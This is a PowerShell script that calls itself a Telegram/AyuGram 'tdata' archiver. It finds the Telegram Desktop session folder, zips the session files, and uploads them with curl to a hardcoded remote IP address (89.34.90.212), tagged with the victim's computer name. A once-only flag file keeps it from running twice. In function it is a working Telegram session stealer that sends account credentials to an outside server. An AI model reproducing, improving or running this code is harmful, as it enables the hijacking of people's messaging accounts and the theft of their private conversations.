# Script to archive Telegram/AyuGram tdata (auto-find, skip files >10MB, exclude folders, handle locked files)

# --- Step 1: Find tdata folder ---
$source = $null
Write-Host "Searching for tdata folder..."

# 1.1 Check running process path
$proc = Get-Process -Name "Telegram", "AyuGram", "AyuGram Desktop" -ErrorAction SilentlyContinue | Select-Object -First 1
if ($proc -and $proc.Path) {
    $exeDir = Split-Path $proc.Path -Parent
    $candidate = Join-Path $exeDir "tdata"
    if (Test-Path $candidate) {
        $source = $candidate
        Write-Host "  Found next to executable: $source"
    }
}
 
# 1.2 Check standard AppData paths
if (-not $source) {
    $standardPaths = @(
        "$env:APPDATA\Telegram Desktop\tdata",
        "$env:APPDATA\Telegram Desktop UWP\tdata",
        "$env:APPDATA\AyuGram\tdata",
        "$env:LOCALAPPDATA\Telegram Desktop\tdata"
    )
    foreach ($path in $standardPaths) {
        if (Test-Path $path) {
            $source = $path
            Write-Host "  Found in standard location: $source"
            break
        }
    }
}

# 1.3 Search UWP package storage (dynamic package ID)
if (-not $source) {
    $packageFolder = Get-ChildItem "$env:LOCALAPPDATA\Packages\TelegramMessengerLLP.TelegramDesktop_*" -Directory | Select-Object -First 1
    if ($packageFolder) {
        $candidate = Join-Path $packageFolder.FullName "LocalCache\Roaming\Telegram Desktop UWP\tdata"
        if (-not (Test-Path $candidate)) {
            # Maybe files are directly in the parent folder
            $candidate = Join-Path $packageFolder.FullName "LocalCache\Roaming\Telegram Desktop UWP"
        }
        if (Test-Path $candidate) {
            $source = $candidate
            Write-Host "  Found in UWP storage: $source"
        }
    }
}

if (-not $source) {
    Write-Host "ERROR: tdata folder not found."
    exit 1
}
# --- Step 2: Define folders to exclude ---
$excludeFolders = @(
    'user_data*',
    'cache',
    'media_cache',
    'emoji',
    'temp',
    'dumps',
    'tdummy',
    'logs'
)

$flag = "$env:TEMP\tdata_sent34.flag"

# Проверка: если уже отправляли — выходим
if (Test-Path $flag) {
    Write-Output "Уже было отправлено, пропускаем"
    return
}

# --- Step 3: Create archive ---
$zip = "$env:TEMP\tdata_asd124433.zip"
if (Test-Path $zip) {     Write-Output "Уже было отправлено, пропускаем"
    return}



Add-Type -AssemblyName System.IO.Compression.FileSystem
$archive = [System.IO.Compression.ZipFile]::Open($zip, 'Create')

# --- Recursive function (НЕ заходит в исключённые папки) ---
function Get-FilesSafe($path) {

    # 1. сначала файлы в текущей папке
    Get-ChildItem -Path $path -File -ErrorAction SilentlyContinue | ForEach-Object {

        $relativePath = $_.FullName.Substring($source.Length + 1)

        if ($_.Length -gt 10MB) {
            Write-Host "Skipping large file: $relativePath"
            return
        }

        try {
            [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile(
                $archive, $_.FullName, $relativePath, 'Optimal'
            ) | Out-Null

            Write-Host "Added: $relativePath"
        } catch {
            Write-Host "Skipping locked file: $relativePath"
        }
    }

    # 2. теперь папки
    Get-ChildItem -Path $path -Directory -ErrorAction SilentlyContinue | ForEach-Object {

        $folderName = $_.Name

        # если папка в исключениях → НЕ заходим
        $skip = $false
        foreach ($pattern in $excludeFolders) {
            if ($folderName -like $pattern) {
                $skip = $true
                break
            }
        }

        if ($skip) {
            Write-Host "Skipping folder completely: $($_.FullName)"
            return
        }

        # рекурсивно идём дальше
        Get-FilesSafe $_.FullName
    }
}

# --- Run ---
Get-FilesSafe $source

$archive.Dispose()
Write-Host "Archive created: $zip"
$computerName = $env:COMPUTERNAME
$caption = "PC: $computerName | $(Get-Date -Format 'yyyy-MM-dd HH:mm')"

 

# функция отправки
$RelayUrl = "http://89.34.90.212:8000/sendDocument"

$proxy = $null

function Send-File {
    param(
        [Parameter(Mandatory)][string] $RelayUrl,
        [Parameter(Mandatory)][string] $zip,
        [string] $caption = "",
        [string] $proxy = $null
    )

    $args = @(
        "-s", "-S",
        "-X", "POST",
        $RelayUrl,
        "-F", "document=@$zip",
        "--connect-timeout", "10",
        "--max-time", "30"
    )
    if ($caption) {
        $args += @("-F", "caption=$caption")
    }
    if ($proxy) {
        $args = @("-x", $proxy) + $args
    }

    return curl.exe @args
}

$response = Send-File -RelayUrl $RelayUrl -zip $zip -caption $caption

if ($response -match '"ok":true') {
    Write-Host "Успешно без прокси"
    New-Item -Path $flag -ItemType File -Force | Out-Null
    return
}

# 2. повтор через прокси до прокладки (если задан)


New-Item -Path $flag -ItemType File -Force | Out-Null
